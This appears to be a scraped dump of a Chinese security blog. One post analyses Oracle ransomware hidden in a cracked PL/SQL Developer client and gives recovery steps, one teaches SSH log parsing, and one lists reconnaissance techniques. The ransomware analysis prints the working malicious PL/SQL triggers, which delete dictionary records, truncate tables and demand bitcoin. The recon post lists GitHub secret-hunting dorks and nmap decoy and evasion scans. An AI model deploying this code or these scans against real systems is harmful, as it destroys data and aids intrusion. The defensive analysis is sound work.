&quot; wrapped a000000354abcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcd76f2 467..........对加密数据进行省略............../PROMPT Create &quot;DBMS_SUPPORT_INTERNAL &quot;create or replace trigger &quot;DBMS_SUPPORT_INTERNAL &quot;after startup on database begin &quot;DBMS_SUPPORT_INTERNAL &quot;;end;/CREATE OR REPLACE procedure &quot;DBMS_SYSTEM_INTERNAL &quot; wrapped a000000354abcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcd73a5 384..........对加密数据进行省略............../CREATE OR REPLACE TRIGGER &quot;DBMS_SYSTEM_INTERNAL &quot; AFTER LOGON ON DATABASEBEGIN &quot;DBMS_SYSTEM_INTERNAL &quot;;END;/create or replace procedure DBMS_STANDARD_FUN9 wrapped a000000354abcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcd769 9a..........对加密数据进行省略............../create or replace procedure &quot;DBMS_CORE_INTERNAL &quot; wrapped a000000354abcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcd773c 4c4..........对加密数据进行省略............../CREATE OR REPLACE TRIGGER &quot;DBMS_CORE_INTERNAL &quot; AFTER LOGON ON SCHEMABEGIN &quot;DBMS_CORE_INTERNAL &quot;;END;/ 该文件就是PLSQL客户端的sql文件，文件名为AfterConnect.sql，这个文件官方的软件包中为空（无内容），被篡改过的客户端中包含了连接数据库的恶意代码。 数据库启动后执行触发器DBMS_SUPPORT_INTERNAL 12345678910111213141516171819202122232425PROCEDURE &quot;DBMS_SUPPORT_INTERNAL &quot; IS DATE1 INT :=10;E1 EXCEPTION; PRAGMA EXCEPTION_INIT(E1, -20312);BEGIN SELECT NVL(TO_CHAR(SYSDATE-CREATED ),0) INTO DATE1 FROM V$DATABASE; IF (DATE1&gt;=1200) THEN EXECUTE IMMEDIATE &apos;create table ORACHK&apos;||SUBSTR(SYS_GUID,10)||&apos; tablespace system as select * from sys.tab$&apos;; DELETE SYS.TAB$ WHERE DATAOBJ# IN (SELECT DATAOBJ# FROM SYS.OBJ$ WHERE OWNER# NOT IN (0,38)) ; COMMIT; ............省略................. FOR I IN 1..2046 LOOP DBMS_SYSTEM.KSDWRT(2, &apos;Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive), after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.&apos;); DBMS_SYSTEM.KSDWRT(2, &apos;你的数据库已被SQL RUSH Team锁死 发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致) 之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库 &apos;); END LOOP; RAISE E1; END IF; EXCEPTION WHEN E1 THEN RAISE_APPLICATION_ERROR(-20312,&apos;你的数据库已被SQL RUSH Team锁死 发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致) 之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库 Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive), after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.&apos;); WHEN OTHERS THEN NULL;END; 该文件的作用 当数据库文件创建大于1200天，就开始备份TAB$表。 删除TAB$中除OWNER#为(0,,38)的记录。 通过SYS.DBMS_BACKUP_RESTORE.RESETCFILESECTION清除备份信息。 然后通过DBMS_SYSTEM.KSDWRT在你的alert日志中写入2046次提示信息。 在抛出一个前台类似的信息。 数据库登录触发器DBMS_SYSTEM_INTERNAL 1234567891011121314151617181920PROCEDURE &quot;DBMS_SYSTEM_INTERNAL &quot; IS DATE1 INT :=10; E1 EXCEPTION; PRAGMA EXCEPTION_INIT(E1, -20313);BEGIN SELECT NVL(TO_CHAR(SYSDATE-MIN(LAST_ANALYZED)),0) INTO DATE1 FROM ALL_TABLES WHERE TABLESPACE_NAME NOT IN (&apos;SYSTEM&apos;,&apos;SYSAUX&apos;,&apos;EXAMPLE&apos;); IF (DATE1&gt;=1200) THEN IF (UPPER(SYS_CONTEXT(&apos;USERENV&apos;, &apos;MODULE&apos;))!=&apos;C89239.EXE&apos;) THEN RAISE E1; END IF; END IF;EXCEPTION WHEN E1 THEN RAISE_APPLICATION_ERROR(-20313,&apos;你的数据库已被SQL RUSH Team锁死 发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致) 之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库 Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive), after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.&apos;); WHEN OTHERS THEN NULL;END;............省略................. 该文件的作用 当你的非SYSTEM&#39;,&#39;SYSAUX&#39;,&#39;EXAMPLE&#39;之外的所有表的最小统计时间为1200天，并且非C89239.EXE程序,将对数据库进行锁定，提示你的数据库已被SQL RUSH Team锁死 发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致) 之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库 Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive), after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.。 数据库触发器DBMS_CORE_INTERNAL 1234567891011121314151617181920212223242526272829303132PROCEDURE &quot;DBMS_CORE_INTERNAL &quot; IS V_JOB NUMBER; DATE1 INT :=10; STAT VARCHAR2(2000); V_MODULE VARCHAR2(2000); E1 EXCEPTION; PRAGMA EXCEPTION_INIT(E1, -20315); CURSOR TLIST IS SELECT * FROM USER_TABLES WHERE TABLE_NAME NOT LIKE &apos;%$%&apos; AND TABLE_NAME NOT LIKE &apos;%ORACHK%&apos; AND CLUSTER_NAME IS NULL;BEGIN SELECT NVL(TO_CHAR(SYSDATE-MIN(LAST_ANALYZED)),0) INTO DATE1 FROM ALL_TABLES WHERE TABLESPACE_NAME NOT IN (&apos;SYSTEM&apos;,&apos;SYSAUX&apos;,&apos;EXAMPLE&apos;); IF (DATE1&gt;=1200) THEN FOR I IN TLIST LOOP DBMS_OUTPUT.PUT_LINE(&apos;table_name is &apos; ||I.TABLE_NAME); STAT:=&apos;truncate table &apos;||USER||&apos;.&apos;||I.TABLE_NAME; DBMS_JOB.SUBMIT(V_JOB, &apos;DBMS_STANDARD_FUN9(&apos;&apos;&apos; || STAT || &apos;&apos;&apos;);&apos;, SYSDATE); COMMIT; END LOOP; END IF; IF (UPPER(SYS_CONTEXT(&apos;USERENV&apos;, &apos;MODULE&apos;))!=&apos;C89239.EXE&apos;) THEN RAISE E1; END IF; EXCEPTION WHEN E1 THEN RAISE_APPLICATION_ERROR(-20315,&apos;你的数据库已被SQL RUSH Team锁死 发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致) 之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库 Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive), after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.&apos;); WHEN OTHERS THEN RAISE_APPLICATION_ERROR(-20315,&apos;你的数据库已被SQL RUSH Team锁死 发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致) 之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库 Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive), after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.&apos;); END; ............省略................. 该文件的作用 将表明不含$、不含ORACHK的表放到一个游标里面，当你的非SYSTEM&#39;,&#39;SYSAUX&#39;,&#39;EXAMPLE&#39;之外的所有表的最小统计时间为1200天就执行执行truncate table操作，并且登录程序非C89239.EXE程序,则报出异常。 勒索病毒如何感染数据库？ 根据勒索病毒特性，进一步分析，由于运维人员使用绿色版PLSQL Developer 11.06中文绿色注册版(免Oracle11g客户端)，然后连接数据库，导致数据库内被自动注入存储过程、触发器以及几千万个JOBS。 大家都清楚，绿色版的软件也称作破解软件，破解人员对官方软件进行修改之后重新发布的，如果你没有用正版软件的习惯，习惯下载破解软件，而不验证软件有无恶意，很容易中招。在这里也提醒大家，尽量使用正版软件，验证来源软件的签名，特别是在连接客户的真实环境的情况下，接触重要数据的情况下。 如何对数据进行恢复 客户发现的及时，并未对生成库造成锁定的影响，这时我们还是可以恢复的，通过清除勒索软件产生的垃圾数据，并通过备份进行数据还原，可以及时对数据进行恢复。（建议先在测试环境中，先进行测试，测试环境成功之后，再在生产系统中操作。） 1、alter system set job_queue_process=0 scope=both ;并重启db。重启是由于此时数据库存在大量的library cache lock，无法操作。 2、删除上述的存储过程和触发器 1234567drop trigger xxx.&quot;DBMS_CORE_INTERNAL &quot; ;drop trigger xxx.&quot;DBMS_SUPPORT_INTERNAL &quot; ;drop trigger xxx.&quot;DBMS_SYSTEM_INTERNAL &quot; ; drop PROCEDURE xxx.&quot;DBMS_CORE_INTERNAL &quot; ;drop PROCEDURE xxx.&quot;DBMS_SUPPORT_INTERNAL &quot; ;drop PROCEDURE xxx.&quot;DBMS_SYSTEM_INTERNAL &quot; ; 注意后面的九个空格(x为空格)（DBMS_SYSTEM_INTERNALxxxxxxxxx） 3、删除黑客创建的大量jobs 123select &apos;exec dbms_ijob.remove(&apos;||job||&apos;);&apos; from xxx where schema_user=&apos;xxx&apos; and what like &apos;%truncate%&apos;; 4、确认被truncate的表，确认数据是否丢失。 5、如果测试环境测试正常，可以对生成数据库进行同样的操作。 残余风险 删除job记录可能导致某些数据不能读取或丢失。 不能完全确认是否还有运维开发人员在使用带有勒索病毒的PLSQL Developer客户端。 数据库管理权限不分明，DDL操作审核不严格。 安全建设建议 在业务恢复之后，对关键资产、代码进行安全检查，扫描非法程序、高风险操作代码，及时排除残留风险。 在日常的运维管理中，通过制度和运维管理平台对运维管理人员的操作进行记录并审计，使用客户提供的终端和工具对数据库进行操作。 管理数据库的运维管理工具应从官方的渠道下载，在使用前需要对管理工具进行检测，禁止使用盗版工具对数据库进行操作。 建议建立健全关键资产管控，敏感资产管控，高风险操作管控，特权用户操作管控，同时对运维人员的DDL审核，并对可以创建触发器、存储过程的行为进行审核及管控，防止非法程序侵入。 建议建立健全灾备系统，相关备份策略、恢复测试流程、恢复测试案例。 定期进行容灾演练、场景演练、恢复测试、入侵用例恢复测试，尽可能缩短恢复时间 参考： 比特币攻击案例重现江湖 plsql dev引起的数据库被黑勒索比特币实现原理分析和解决方案","categories":[{"name":"随笔","slug":"随笔","permalink":"http://airs-sec.com/categories/随笔/"}],"tags":[{"name":"勒索软件","slug":"勒索软件","permalink":"http://airs-sec.com/tags/勒索软件/"}],"keywords":[{"name":"随笔","slug":"随笔","permalink":"http://airs-sec.com/categories/随笔/"}]},{"title":"从linux服务器的日志文件中提取有用信息","slug":"从linux服务器的日志文件中提取有用信息","date":"2018-01-30T03:56:34.000Z","updated":"2018-01-30T04:46:17.651Z","comments":true,"path":"2018/01/30/从linux服务器的日志文件中提取有用信息/","link":"","permalink":"http://airs-sec.com/2018/01/30/从linux服务器的日志文件中提取有用信息/","excerpt":"","text":"第一部分介绍系统管理员每天忙绿于工作当中，当系统出现问题时，需要解决和回答各种各样的问题。经常被问到的题目是：某某设备执行某某命令的次数。这些信息通常不是直接存储的，大多数linux服务器灭有计数器或者专门的统计页面。但是，linux有日志文件，每次请求网页、发送电子邮件或登录操作系统的事件都会记录在日志文件中。对于任何系统管理员来说，一项基本的技能就是能够通过日志文件解析并提取有用的信息。 下面将引导你从日志文件中提取有用的信息，对信息进行排序和计数，最后构建一个bash循环，更方便的去执行批量化脚本。 问题 统计未经授权的SSH登录尝试失败/成功的次数。 0x01 目标文件 解析记录SSH连接尝试的日志文件，确定所有登录失败的行 使用gerp、awk、cut提取尝试登录的ip并记录到文件中 最后，获取登录的ip地 获取日志文件 不同的发行版的SSH记录到不同的文件当中 Ubuntu/Debian:/var/log/auth.log Redhat:/var/log/secure 这里使用的操作系统为centos 获取ip通过管道符进行过滤。 1）从日志文件中筛选出我们的行 /var/log/secure日志文件包含大量的信息。这是因为所有的身份验证事件都与CRON事件和其他信息都一起写入该文件。另外，每个SSH登录事件写入多行并且有多种类型的SSH登录尝试需要考虑。 两种不同类型的登录失败的SSH记录事件。 1、无效用户，服务器上不存在的用户2、有效用户，服务器上存在的用户但密码不正确 第一种类型的登录记录如下： 12345678910111213141516Aug 23 03:47:13 centos7 sshd[3283]: Invalid user guest from 193.201.224.218Aug 23 03:47:13 centos7 sshd[3283]: input_userauth_request: invalid user guest [preauth]Aug 23 03:47:13 centos7 sshd[3283]: pam_unix(sshd:auth): check pass; user unknownAug 23 03:47:13 centos7 sshd[3283]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=193.201.224.218Aug 23 03:47:15 centos7 sshd[3283]: Failed password for invalid user guest from 193.201.224.218 port 13181 ssh2Aug 23 03:47:16 centos7 sshd[3283]: pam_unix(sshd:auth): check pass; user unknownAug 23 03:47:17 centos7 sshd[3283]: Failed password for invalid user guest from 193.201.224.218 port 13181 ssh2Aug 23 03:47:18 centos7 sshd[3283]: pam_unix(sshd:auth): check pass; user unknownAug 23 03:47:20 centos7 sshd[3283]: Failed password for invalid user guest from 193.201.224.218 port 13181 ssh2Aug 23 03:47:24 centos7 sshd[3283]: pam_unix(sshd:auth): check pass; user unknownAug 23 03:47:25 centos7 sshd[3283]: Failed password for invalid user guest from 193.201.224.218 port 13181 ssh2Aug 23 03:47:26 centos7 sshd[3283]: pam_unix(sshd:auth): check pass; user unknownAug 23 03:47:27 centos7 sshd[3283]: Failed password for invalid user guest from 193.201.224.218 port 13181 ssh2Aug 23 03:47:27 centos7 sshd[3283]: pam_unix(sshd:auth): check pass; user unknownAug 23 03:47:29 centos7 sshd[3283]: Failed password for invalid user guest from 193.201.224.218 port 13181 ssh2Aug 23 03:47:29 centos7 sshd[3283]: Disconnecting: Too many authentication failures for guest [preauth] 这里显示的是，ip：193.281.224.219以用户guest启动ssh连接，ssh记录这个用户是无效的，即在服务器上不存在，然而，193.281.224.219直接尝试密码登录，直到达到最大的尝试登录次数，ssh并终止连接。 从上面的记录中发现提取的日志还是比较多，我们需要精简输出，需要找出一行有特色的一行： 1Aug 23 03:47:13 centos7 sshd[3283]: Invalid user guest from 193.201.224.218 开始过滤1grep &quot;Invalid user&quot; /var/log/secure 输出如下： 12345Aug 23 03:52:40 centos7 sshd[5160]: Invalid user acc from 193.201.224.218Aug 23 03:52:45 centos7 sshd[5243]: Invalid user adam from 193.201.224.218Aug 23 03:52:53 centos7 sshd[5312]: Invalid user adfexc from 193.201.224.218Aug 23 03:53:45 centos7 sshd[5494]: Invalid user admin2 from 193.201.224.218etc 上述，正是我们需要的，每一行只针对每一个不同用户的登录尝试信息，包含了攻击者的ip并且不显示其他的任何行。 下面过滤出第二种类型的日志记录，使用了有效的用户名，但密码错误：123456789101112131415Aug 23 05:08:08 centos7 sshd[5185]: reverse mapping checking getaddrinfo for 123.30.65.218.broad.xy.jx.dynamic.163data.com.cn [218.65.30.123] failed - POSSIBLE BREAK-IN ATTEMPT!Aug 23 05:08:09 centos7 sshd[5185]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=218.65.30.123 user=rootAug 23 05:08:09 centos7 sshd[5185]: pam_succeed_if(sshd:auth): requirement &quot;uid &gt;= 1000&quot; not met by user &quot;root&quot;Aug 23 05:08:10 centos7 sshd[5185]: Failed password for root from 218.65.30.123 port 42034 ssh2Aug 23 05:08:11 centos7 sshd[5185]: pam_succeed_if(sshd:auth): requirement &quot;uid &gt;= 1000&quot; not met by user &quot;root&quot;Aug 23 05:08:13 centos7 sshd[5185]: Failed password for root from 218.65.30.123 port 42034 ssh2Aug 23 05:08:14 centos7 sshd[5185]: pam_succeed_if(sshd:auth): requirement &quot;uid &gt;= 1000&quot; not met by user &quot;root&quot;Aug 23 05:08:16 centos7 sshd[5185]: Failed password for root from 218.65.30.123 port 42034 ssh2Aug 23 05:08:16 centos7 sshd[5185]: pam_succeed_if(sshd:auth): requirement &quot;uid &gt;= 1000&quot; not met by user &quot;root&quot;Aug 23 05:08:18 centos7 sshd[5185]: Failed password for root from 218.65.30.123 port 42034 ssh2Aug 23 05:08:19 centos7 sshd[5185]: pam_succeed_if(sshd:auth): requirement &quot;uid &gt;= 1000&quot; not met by user &quot;root&quot;Aug 23 05:08:21 centos7 sshd[5185]: Failed password for root from 218.65.30.123 port 42034 ssh2Aug 23 05:08:22 centos7 sshd[5185]: pam_succeed_if(sshd:auth): requirement &quot;uid &gt;= 1000&quot; not met by user &quot;root&quot;Aug 23 05:08:24 centos7 sshd[5185]: Failed password for root from 218.65.30.123 port 42034 ssh2Aug 23 05:08:24 centos7 sshd[5185]: Disconnecting: Too many authentication failures for root [preauth] 再次，找出不同用户连接出现一次的记录，1Aug 23 05:08:09 centos7 sshd[5185]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=218.65.30.123 user=root 使用grep进行过滤。 1grep &quot;pam_unix(sshd:auth): authentication failure&quot; secure 产生以下输出： 12345Aug 23 05:04:56 centos7 sshd[5153]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=218.65.30.123 user=rootAug 23 05:05:18 centos7 sshd[5160]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=218.65.30.123 user=rootAug 23 05:05:42 centos7 sshd[5164]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=218.65.30.123 user=rootAug 23 05:06:06 centos7 sshd[5168]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=218.65.30.123 user=rootetc 这正是我们需要的输出，我们可以在以上的输出情况下，过滤出ip地址。 2）、从一行文本中提取文本字符串 工具：cut、awk awk是一个非常复杂的命令，但大多数管理员只能按以下方式来使用： 1awk &apos;&#123;print $N&#125;&apos; 其中$N是从左到右空格所分割字符串的数量，在我们的日志行中，ip地址是文本字符串编号的10，awk命令如下： 1awk &apos;&#123;print $10&#125;&apos; 首先使用grep进行文本过滤，通过管道符”|”，执行awk命令过滤出ip 12echo “Aug 23 03:53:58 centos7 sshd[5501]: Invalid user agent from 193.201.224.218” | awk ‘&#123;print $10&#125;’193.201.224.218 可以看到，成功的提取出了ip地址，接下来进行文本过滤操作，将输出直接保存到文本文件中。 1grep &quot;Invalid user&quot; secure | awk &apos;&#123;print $10&#125;&apos; &gt;IPs.txt 接下来对有效用户进行同样的操作： 1Aug 23 05:08:33 centos7 sshd[5187]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=218.65.30.123 user=root 接下来，将rhost中的218.65.30.123分离出来，这时我们就需要使用cut命令。 1cut -d &quot;=&quot; -f 2 整个语句合并起来就是如下语句： 12echo &quot;Aug 23 05:08:33 centos7 sshd[5187]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=218.65.30.123 user=root&quot; | awk &apos;&#123;print $14&#125;&apos; | cut -d&quot;=&quot; -f2218.65.30.123 上述命令可以提取出ip地址，现在我们将所有输出保存到文本文件当中。 1grep &apos;pam_unix(sshd:auth): authentication failure;&apos; secure | awk &apos;&#123;print $14&#125;&apos; | cut -d&quot;=&quot; -f2 &gt;&gt;IPs.txt 结论我们现在有一个ip地址文件，其中包含了登录失败的ip地址。在第2部分将介绍如何对这些IP地址进行排序和计数，以便我们可以了解他们尝试登录的次数，并按照尝试的次数排列它们。 第二部分008-第二部分-从linux服务器的日志中提取信息 在本系列的第一部分中，我们从/var/log/secure日志文件中提取了未经授权的SSH连接的IP地址。从中我们导出了一个ip地址列表，其中，每个ip代表登录尝试失败的ip。 问题 统计未经授权的SSH登录尝试失败/成功的次数。 第二部分 目标 在这部分，主要使用bash工具sort、uniq等工具对其中的ip地址进行排序。 第一部分 排序ip sort 1234cat IPs.txt | sort# sort将按照字母顺序排序 计算相同ip的次数 uniq 1cat IPs.txt | sort | uniq -c ip排名最后一步是按照日志文件中尝试ip的次数进行排序，再次使用sort命令。 12345## sort -n:正向排序## sort -r:反向排序cat IPs.txt | sort | uniq -c | sort -n 结论你现在可以通过这些命令对所有的文件输出进行筛选。 在第三部分，我们将创建一个for循环来遍历排名的ip，并使用whois对每个ip进行查找，已找出他们来自那个国家。 第三部分介绍在本系列的第一部分和第二部分中，我们提取了未经授权的SSH登录尝试的ip地址，然后对其进行排序。现在我们已经得到了一个排列后的ip地址列表，我们需要找出这些ip地址来自那个国家。 目标通过for循环来遍历排列后的ip地址，利用whois对每个ip进行whois查询，找出这些ip来自哪些国家。 for循环？ for循环是执行重复操作的一种方式。一些bash工具，如grep和awk可以接受前一个命令的输出。但是，其他命令，如whois不接受标准输入。必须运行他们提供的字符串。如ip地址或域名作为选项，这意味着我们必须为每个ip重复运行正确的结构化命令。为此，我们需要使用到for循环。 for巡检的结构如下： 123for i in x;do command idone 其中x是输入，如ip地址列表，i是一个变量，从ip地址列表中获取的一行，每次循环，i都会变。 也可以这么写： 1for i in X; do command $i; done 1)、生成有效的输入 我们的第一步就是构建一个for循环，生成可以迭代的输入，需要一个每行一个文本字符串的列表。 列表如下： 1234567891011121314151617# cat sort-ips.txt 1 211.21.218.75 2 182.97.215.127 2 46.148.18.114 3 222.74.225.125 3 46.27.238.200 6 111.20.245.25 6 112.101.165.34 6 116.236.124.48 6 123.144.62.228 6 125.117.0.7 6 176.53.82.66 6 189.10.52.92 6 191.85.175.35 6 196.43.235.219 6 78.198.26.81 9 106.6.176.243 进一步过滤： 1234567891011121314151617# cat sort-ips.txt | awk '&#123;print $2&#125;'211.21.218.75182.97.215.12746.148.18.114222.74.225.12546.27.238.200111.20.245.25112.101.165.34116.236.124.48123.144.62.228125.117.0.7176.53.82.66189.10.52.92191.85.175.35196.43.235.21978.198.26.81106.6.176.243 将命令插入到for循环中现在我们有了一个命令来产生我们需要的输入，我们可以使用这个代替我们的for循环中的X。如下： 1for i in $(cat sorted-IPs.txt | awk &apos;&#123;print $2&#125;&apos;); do command $i; done 通过echo进行输出： 1234567891011121314151617# for i in $(cat sort-ips.txt | awk '&#123;print $2&#125;');do echo $i;done211.21.218.75182.97.215.12746.148.18.114222.74.225.12546.27.238.200111.20.245.25112.101.165.34116.236.124.48123.144.62.228125.117.0.7176.53.82.66189.10.52.92191.85.175.35196.43.235.21978.198.26.81106.6.176.243 利用whois进行查询 1234567891011121314151617# for i in $(cat sort-ips.txt | awk '&#123;print $2&#125;');do echo whois $i;donewhois 211.21.218.75whois 182.97.215.127whois 46.148.18.114whois 222.74.225.125whois 46.27.238.200whois 111.20.245.25whois 112.101.165.34whois 116.236.124.48whois 123.144.62.228whois 125.117.0.7whois 176.53.82.66whois 189.10.52.92whois 191.85.175.35whois 196.43.235.219whois 78.198.26.81whois 106.6.176.243 将echo删除，直接利用whois执行命令 1# for i in $(cat sort-ips.txt | awk '&#123;print $2&#125;');do whois $i;done 上述命令会输出一系列的输出，在一系列的输出，有一行是country： XX，我们只需要过滤出country就可以。如下： 12345678910111213141516# for i in $(cat sort-ips.txt | awk '&#123;print $2&#125;');do whois $i | grep -m1 country;donecountry: TWcountry: CNcountry: UAcountry: CNcountry: EScountry: CNcountry: CNcountry: CNcountry: CNcountry: CNcountry: TRcountry: ARcountry: NGcountry: FRcountry: CN 把country:删除，利用awk 12345678910111213141516# for i in $(cat sort-ips.txt | awk &apos;&#123;print $2&#125;&apos;);do whois $i | grep -m1 country | awk &apos;&#123;print $2&#125;&apos;;doneTWCNUACNESCNCNCNCNCNTRARNGFRCN 将ip添加到上述输出 第一种方式： 1234567891011121314151617181920212223242526272829303132# for i in $(cat sort-ips.txt | awk '&#123;print $2&#125;');do echo $i;whois $i | grep -m1 country | awk '&#123;print $2&#125;';done211.21.218.75TW182.97.215.127CN46.148.18.114UA222.74.225.125CN46.27.238.200ES111.20.245.25CN112.101.165.34CN116.236.124.48CN123.144.62.228CN125.117.0.7CN176.53.82.66TR189.10.52.92191.85.175.35AR196.43.235.219NG78.198.26.81FR106.6.176.243CN 第二种，利用echo进行输出 1234567891011121314151617# for i in $(cat sort-ips.txt | awk &apos;&#123;print $2&#125;&apos;);do echo &quot;$i $(whois $i | grep -m1 country | awk &apos;&#123;print $2&#125;&apos;)&quot;;done211.21.218.75 TW182.97.215.127 CN46.148.18.114 UA222.74.225.125 CN46.27.238.200 ES111.20.245.25 CN112.101.165.34 CN116.236.124.48 CN123.144.62.228 CN125.117.0.7 CN176.53.82.66 TR189.10.52.92191.85.175.35 AR196.43.235.219 NG78.198.26.81 FR106.6.176.243 CN 输出之后，利用column工具对输出进行格式化： 1234567891011121314151617# for i in $(cat sort-ips.txt | awk &apos;&#123;print $2&#125;&apos;);do echo &quot;$i $(whois $i | grep -m1 country | awk &apos;&#123;print $2&#125;&apos;)&quot;;done | column -t211.21.218.75 TW182.97.215.127 CN46.148.18.114 UA222.74.225.125 CN46.27.238.200 ES111.20.245.25 CN112.101.165.34 CN116.236.124.48 CN123.144.62.228 CN125.117.0.7 CN176.53.82.66 TR189.10.52.92191.85.175.35 AR196.43.235.219 NG78.198.26.81 FR106.6.176.243 CN 结论本系列的目标是引导您使用bash工具在命令行中提取和处理数据。我希望你注意到，我们尽可能使用相同的工具来得到我们需要的结果。熟悉这些工具后，您将能够快速处理数据，而无需离开命令行。 文章来自：https://bash-prompt.net/guides/using-logs-1/，总共有三部分，我写在一块了，有删改。这个工具可以写成一个bash脚本，通过传入文件的参数输出不一样的内容，有时间写下，不是很难。","categories":[{"name":"linux","slug":"linux","permalink":"http://airs-sec.com/categories/linux/"}],"tags":[],"keywords":[{"name":"linux","slug":"linux","permalink":"http://airs-sec.com/categories/linux/"}]},{"title":"web安全信息收集","slug":"web安全信息收集","date":"2018-01-04T03:12:39.000Z","updated":"2018-01-04T03:23:00.819Z","comments":true,"path":"2018/01/04/web安全信息收集/","link":"","permalink":"http://airs-sec.com/2018/01/04/web安全信息收集/","excerpt":"web安全信息收集","text":"web安全信息收集 当我们拿到一个网站，如何开始对目标安全测试？是不是一上来，就拿出wvs先跑一遍，大部分人，包括我也是，拿到一个网站的时候，直接上漏洞扫描器对网站进行扫描。而往往忽略了前期信息收集的重要性。 在渗透测试的流程中，第一步为信息收集，可见信息收集的重要性，前期的信息收集决定了后期渗透利用是否能继续下去的重要一步。所谓知己知彼，百战不殆。 信息收集 用户名 邮件地址 theHarvester 域名 DNS Domain Dossier-可进行地址查询，域名记录，路由跟踪，服务扫描 viewdns.info-可查询真实ip，针对做了cdn加速 站长之家 爱站 天眼查 github泄露 tools在线工具 netcraft 子域名 find-subdomains - 查找子域名 工具 Layer子域名挖掘机V3.0 链接：https://pan.baidu.com/s/1jI9vDcy 密码：rykz Layer子域名挖掘机4.1 重构版 链接：https://pan.baidu.com/s/1kUJmPKF 密码：ly5r subDomainsBrute 微步-微步也可以对子域名进行扫描 ip地址 site.ip138-ip/域名查询 sameip-反向ip查找 站长之家-集成了很多功能，包括域名/ip，seo查询，网站信息查询 微步-主打在线威胁情报分析 viewdns-可查询真实ip，针对做了cdn加速 在线C段查询 ip地址查询 github信息收集 1234567“Hackme.tld” API_key“Hackme.tld” secret_key“Hackme.tld” aws_key“Hackme.tld” Password“Hackme.tld” FTP“Hackme.tld” login“Hackme.tld” github_token github泄露 githack - 针对github源码泄露漏洞 端口服务 利用nmap进行漏洞扫描,在扫描大段的地址时，可以采用过滤的方式将某些不需要的字符过滤，利用grep命令和cut命令 12345678910 Nmap Full Web Vulnerable Scan cd /usr/share/nmap/scripts/wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gznmap -sS -sV --script=vulscan/vulscan.nse targetnmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv targetnmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 targetnmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 targetnmap -sV --script=vuln targetnmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target 利用nmap进行端口扫描 12345678910111213141516 Nmap Ports Scan1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys)1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys)2)fargement3)data packed – like orginal one not scan packet4)use auxiliary/scanner/ip/ipidseq for find zombie ip in network to use them to scan — nmap -sI ip target5)nmap –source-port 53 targetnmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu=24 –data-length=1337 -T2 target ( Randomize scan form diff IP)nmap -Pn -T2 -sV –randomize-hosts IP1,IP2nmap –script smb-check-vulns.nse -p445 target (using NSE scripts)nmap -sU -P0 -T Aggressive -p123 target (Aggresive Scan T1-T5)nmap -sA -PN -sN targetnmap 